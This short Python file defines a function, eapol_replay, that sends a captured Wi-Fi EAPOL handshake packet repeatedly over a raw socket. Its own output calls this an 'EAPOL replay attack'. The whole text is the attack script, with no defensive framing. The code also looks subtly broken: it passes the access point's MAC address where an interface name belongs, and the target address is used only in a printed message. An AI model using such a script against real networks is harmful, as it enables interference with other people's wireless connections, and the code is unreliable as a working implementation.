import socket
import time

def eapol_replay(packet, target_mac, ap_mac, count=10, delay=0.1):
    """
    Replay EAPOL handshake packets.

    Args:
        packet (bytes): The captured EAPOL packet to replay.
        target_mac (str): Target MAC address.
        ap_mac (str): Access Point MAC address.
        count (int): Number of times to replay the packet.
        delay (float): Delay between each replay in seconds.
    """
    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)

    print(f"Replaying EAPOL handshake packets {count} times to target: {target_mac}")
    for i in range(count):
        print(f"Replaying packet {i + 1}/{count}")
        sock.sendto(packet, (ap_mac, 0))
        time.sleep(delay)

    sock.close()
    print("EAPOL replay attack completed.")
